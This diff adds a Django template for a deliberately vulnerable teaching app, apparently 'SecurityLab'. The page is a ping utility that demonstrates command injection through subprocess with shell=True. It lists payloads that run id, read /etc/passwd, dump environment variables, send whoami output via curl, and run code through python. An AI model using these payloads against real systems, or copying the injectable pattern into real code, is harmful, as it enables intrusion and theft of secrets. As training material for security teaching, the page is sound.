@@ -1,0 +1,31 @@
+{% extends "base.html" %}
+{% block title %}Ping (Command Injection) – SecurityLab{% endblock %}
+{% block content %}
+<div class="card">
+  <h1>📡 Ping Utility – Command Injection Demo</h1>
+
+  <div class="vuln-box">
+    <strong>[V-25] Command Injection</strong><br>
+    Input is passed to <code>subprocess.check_output(f"ping -c 2 {host}", shell=True)</code>.<br><br>
+    <strong>Payloads:</strong><br>
+    <code>127.0.0.1; id</code><br>
+    <code>127.0.0.1; cat /etc/passwd</code><br>
+    <code>127.0.0.1; ls -la /</code><br>
+    <code>127.0.0.1; env</code>  ← dumps environment variables<br>
+    <code>127.0.0.1 | curl http://127.0.0.1:8080/?data=$(whoami)</code><br>
+    <code>127.0.0.1; python3 -c "import os; os.system('id > /tmp/rce.txt')"</code>
+  </div>
+
+  <form method="post">
+    {% csrf_token %}
+    <label>Hostname / IP</label>
+    <input type="text" name="host" value="{{ host }}" placeholder="127.0.0.1">
+    <button type="submit">Ping</button>
+  </form>
+
+  {% if output %}
+    <label style="margin-top:16px">Output</label>
+    <pre>{{ output }}</pre>
+  {% endif %}
+</div>
+{% endblock %}
